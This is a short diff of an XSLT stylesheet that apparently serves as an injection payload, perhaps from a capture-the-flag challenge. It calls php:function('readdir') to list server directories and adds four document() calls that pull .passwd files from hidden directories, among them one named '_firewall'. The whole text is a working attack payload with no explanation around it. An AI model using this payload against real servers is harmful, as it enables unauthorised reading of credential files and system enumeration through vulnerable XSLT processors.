@@ -45,7 +45,15 @@
         <br/>
         <xsl:value-of select="php:function('readdir')"/>
         <br/>
-        
+        <xsl:copy-of select="document('/.6ff3200bee785801f420fba826ffcdee/.passwd')"/>
+        <br/>
+        <xsl:copy-of select="document('/._firewall/.passwd')"/>
+        <br/>
+        <xsl:copy-of select="document('/6ff3200bee785801f420fba826ffcdee/.passwd')"/>
+        <br/>
+        <xsl:copy-of select="document('/_firewall/.passwd')"/>
+        <br/>
+
         
         
     </p>
